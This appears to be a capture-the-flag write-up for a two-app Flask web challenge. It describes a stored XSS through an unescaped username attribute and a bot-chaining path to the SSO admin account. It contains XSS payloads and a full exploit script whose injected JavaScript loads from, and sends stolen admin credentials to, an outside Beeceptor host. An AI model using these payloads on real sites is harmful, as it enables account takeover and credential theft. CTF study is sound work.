{% raw %}

# Hey there!

This is an analysis of the "Single Slice Of CakeNews" CTF challenge, a multi-stage web challenge that involved finding a XSS vulnerability, manipulating the behavior of automated bots, and chaining exploits to steal administrator credentials from a SSO portal.

### **Challenge Overview**

*   **Name:** Single Slice Of CakeNews
*   **Difficulty:** Medium-Hard
*   **Author:** 0xjeppe
*   **Description:** The scenario involves a news website, `CakeNews.ctf`, which has been acquired by a larger company, "Brunnerne." The site was hastily updated to use the company's central SSO service, `BrunnerneLogin.ctf`. The challenge is to find flaws in this new integration to retrieve the flag from the SSO service.

***
# بِسْمِ اللهِ الرَّحْمٰنِ الرَّحِيْمِ

### Part 1: Analyzing the Backend and Finding the Attack Surface

The first step was to understand the application architecture. The provided code shows two distinct Flask applications:
1.  **`cakenews`**: The main news website, running on port 1337.
2.  **`brunnernelogin`**: The SSO portal, running on port 1338.

The ultimate goal is the flag, which is stored in the `brunnernelogin` database and associated with the `admin@brunnerne.ctf` user account. This immediately told us our goal was to compromise the admin account on the SSO service.

Our initial reconnaissance of the `cakenews` application focused on user-generated content, as that's the most common place for injection vulnerabilities. The comment section on articles was the prime suspect. Looking at the chat logs, our initial thought process was confirmed:

> **キ Mushroom:** there is an xss in article comments
>
> **l3af:** wait wheres the xss again is it in the username or the content
>
> **キ Mushroom:** Content

This led us down the first path: trying to find a bypass for the `bleach` library used to sanitize the comment *content*. In `cakenews/app.py`, we found the sanitization call:

```python
# cakenews/app.py - in add_article_comment()

content = bleach.clean((data.get('content') or '').strip())
# ...
c.execute('INSERT INTO comments (article_id, username, content) VALUES (?,?,?)',
          (article_id, user.get('username', 'user'), content))
```

We noticed the `bleach` version used (`5.0.1`) was outdated and had known vulnerabilities. This seemed promising, but after trying several known payloads, none of them worked. This turned out to be a red herring; the library version wasn't the vulnerability. The real flaw was much simpler.

### Part 2: The Real Vulnerability - The Unsanitized Username

The key was in what *wasn't* being sanitized. While the `content` was cleaned, the `username` was not.

1.  **At Registration:** The `username` is taken from user input and inserted directly into the `users` table without sanitization.
2.  **At Comment Rendering:** The client-side JavaScript (`cakenews/static/js/article.js`) retrieves the comments and renders them. It correctly escapes the username where it's displayed as text, but critically, it injects the raw username into a `data-username` attribute:

```javascript


const renderComment = c => `
  <div class="comment-card">
    <div class="flex items-center justify-between mb-2">
      <span class="font-medium text-gray-900" data-username="${c.username}">
        ${escapeHTML(c.username)}
      </span>
...
```

This is the XSS vulnerability. By registering a user with a crafted username, we can break out of the `data-username` attribute and inject arbitrary HTML.

A simple payload like `name"><script>alert(1)</script>` would fail due to modern XSS filters. A payload using an event handler is needed:

`hacker"><img src=x onerror="alert(document.cookie)">`


### Part 3: The Exploit Path - Chaining Bots

We had a solid XSS vulnerability, but we needed the admin to visit the page. The application's `bots` directory revealed the path forward.

*   `journalist_bot.py`: Visits articles that are reported by regular users.
*   `admin_bot.py`: Visits articles that are escalated to an admin by a journalist.

The exploit path became clear:
1.  Inject our XSS payload via a comment.
2.  Report the article. This triggers the **journalist bot**.
3.  Our JavaScript payload will execute in the journalist's browser. We'll use the journalist's session token to make an API call to **escalate the report to the admin**.
4.  This triggers the **admin bot**, which now visits our page.
5.  The payload executes again, this time in the admin's browser, to steal their credentials.

A crucial detail was found in `admin_bot.py`. The bot contains a flawed login function that only runs if its `localStorage` is empty. Our payload could simply call `localStorage.clear()` to trigger it.

### Part 4: The Final Exploit - Stealing the Credentials

The final step was to craft a  JavaScript payload hosted on Beeceptor (for ease).

1.  **Stage 1 (Journalist Context):** If the payload detects it's running as a 'journalist' (by checking `localStorage`), it uses the journalist's auth token to call `/api/articles/.../report-admin`.
2.  **Stage 2 (Admin Context):** Otherwise, it assumes it's the admin. It monkey-patches the browser's `fetch` function to intercept any login attempts and exfiltrate the credentials to our Beeceptor endpoint. It then clears `localStorage`, forcing the bot to trigger its login function.

This Python script automates the entire process:

```python
# Final Exploit Script
import requests
import random
import string
import json
import base64
import sys
from urllib.parse import urljoin

# --- Helper Functions ---
def print_banner():
    #SWAGGER L33TCODER1997
    banner = """
    ==========================================================================
                    Single Slice Of CakeNews - Automated Exploit
    ==========================================================================
    """
    print(banner)

def generate_random_string(length=8):
    """Generates a random string of lowercase letters."""
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def generate_js_payload(beeceptor_host):
    """Generates the JavaScript payload with the user's Beeceptor endpoint."""
    js_payload_template = """
(async () => {{
    try {{
        const profile = JSON.parse(localStorage.getItem('cakenewsUserProfile'));
        const token = localStorage.getItem('cakenewsAccessToken');
        const articleId = window.__ARTICLE_ID__;
        const CATCHER_URL = "https://{beeceptor_host}/log";

        if (profile && profile.role === 'journalist') {{
            // Stage 1: If journalist, escalate the report to the admin
            await fetch(`/api/articles/${{articleId}}/report-admin`, {{
                method: 'POST',
                headers: {{ 'Authorization': `Bearer ${{token}}` }}
            }});
        }} else {{
            // Stage 2: We are likely the admin bot. Prepare to steal credentials.
            const originalFetch = window.fetch;
            window.fetch = function(url, options) {{
                if (options && options.body && url.toString().includes('/api/login')) {{
                    // Exfiltrate the credentials to our Beeceptor endpoint
                    originalFetch(`${{CATCHER_URL}}?creds=${{btoa(options.body)}}`);
                }}
                return originalFetch.apply(this, arguments);
            }};
            const loginForm = document.getElementById('cakeLoginForm');
            if (loginForm) {{
                loginForm.setAttribute('action', '/api/login');
            }}
            localStorage.clear();
        }}
    }} catch (e) {{ /* Fail silently */ }}
}})();
"""
    return js_payload_template.format(beeceptor_host=beeceptor_host).strip()

# --- Main Exploit Logic ---
def main():
    print_banner()
    cakenews_base_url = input("[+] Enter the CakeNews base URL: ").strip()
    sso_base_url = input("[+] Enter the BrunnerneLogin (SSO) base URL: ").strip()
    beeceptor_endpoint = input("[+] Enter your Beeceptor endpoint name: ").strip()
    beeceptor_host = f"{beeceptor_endpoint}.free.beeceptor.com"
    payload_url = f"https://{beeceptor_host}/payload.js"
    print("-" * 74)
    js_payload = generate_js_payload(beeceptor_host)
    print("[*] STEP 1: Manual Beeceptor Setup")
    print(f"    1. Go to: https://beeceptor.com/console/{beeceptor_endpoint}")
    print("    2. Create a new mocking rule for GET /payload.js")
    print("    3. Paste the following into the response body:")
    print("-" * 74)
    print(js_payload)
    print("-" * 74)
    print("    4. Set the 'Content-Type' to 'application/javascript' and save.")
    input("[?] Press Enter when you have set up the Beeceptor rule...")
    print("\n[*] STEP 2: Registering a user with the XSS payload...")
    session = requests.Session()
    random_user = generate_random_string()
    js_loader = f"var s=document.createElement('script');s.src='{payload_url}';document.body.appendChild(s);"
    malicious_username = f"{random_user}'\"><img src=x onerror=\"{js_loader}\">"
    user_email = f"{random_user}@exploit.com"
    user_password = generate_random_string(12)
    register_payload = {"email": user_email, "username": malicious_username, "password": user_password, "password_confirmation": user_password}
    try:
        r = session.post(urljoin(cakenews_base_url, "/api/register"), json=register_payload, timeout=10)
        if r.status_code != 201:
            print(f"[-] Failed to register user: {r.text}")
            sys.exit(1)
        print(f"[+] Successfully registered malicious user '{user_email}'.")
    except requests.RequestException as e:
        print(f"[-] Error connecting to CakeNews: {e}")
        sys.exit(1)
    print("\n[*] STEP 3: Logging in and planting the payload...")
    login_payload = {"email": user_email, "password": user_password}
    try:
        r = session.post(urljoin(cakenews_base_url, "/api/login"), json=login_payload, timeout=10)
        token = r.json().get('token')
        auth_header = {'Authorization': f'Bearer {token}'}
        comment_payload = {"content": "Great article!"}
        r_comment = session.post(urljoin(cakenews_base_url, "/api/articles/1/comments"), json=comment_payload, headers=auth_header, timeout=10)
        if r_comment.status_code != 201:
            print(f"[-] Failed to post comment: {r_comment.text}")
            sys.exit(1)
        print("[+] Malicious comment posted successfully.")
    except (requests.RequestException, KeyError, json.JSONDecodeError) as e:
        print(f"[-] Error during login/comment phase: {e}")
        sys.exit(1)
    print("\n[*] STEP 4: Triggering the bots...")
    try:
        r_report = session.post(urljoin(cakenews_base_url, "/api/articles/1/report-journalist"), headers=auth_header, timeout=10)
        if r_report.status_code == 200:
            print("[+] Article reported. This will trigger the exploit chain.")
        else:
            print(f"[-] Failed to report article: {r_report.text}")
            sys.exit(1)
    except requests.RequestException as e:
        print(f"[-] Error reporting article: {e}")
        sys.exit(1)
    print("\n[*] STEP 5: Waiting for admin credentials...")
    print(f"    - Check your Beeceptor dashboard at https://beeceptor.com/console/{beeceptor_endpoint}")
    print("    - Wait for a request to '/log' with a 'creds' parameter.")
    b64_creds = input("\n[?] Paste the captured base64 credentials here: ").strip()
    print("\n[*] STEP 6: Decoding credentials and fetching the flag...")
    try:
        admin_creds = json.loads(base64.b64decode(b64_creds).decode('utf-8'))
        print(f"[+] Decoded admin credentials: {admin_creds.get('email')} / {admin_creds.get('password')}")
        r_sso_login = requests.post(urljoin(sso_base_url, "/api/login"), json=admin_creds, timeout=10)
        sso_token = r_sso_login.json().get('token')
        print("[+] Successfully logged into SSO as admin.")
        sso_auth_header = {'Authorization': f'Bearer {sso_token}'}
        r_sso_profile = requests.get(urljoin(sso_base_url, "/api/profile"), headers=sso_auth_header, timeout=10)
        flag = r_sso_profile.json().get('flag')
        print("\n" + "="*74)
        print(f"    [!] FLAG FOUND: {flag}")
        print("="*74)
    except Exception as e:
        print(f"[-] An error occurred: {e}")

if __name__ == "__main__":
    main()
```

### Conclusion

The "Single Slice Of CakeNews" challenge was a fantastic example of a realistic web application vulnerability. It was about identifying a simple logic error failing to sanitize one field out of two and understanding how to chain that vulnerability through the application's features to get the flag. 

A big thanks to Mushroom for the collaboration in solving this challenge.
{% endraw %}
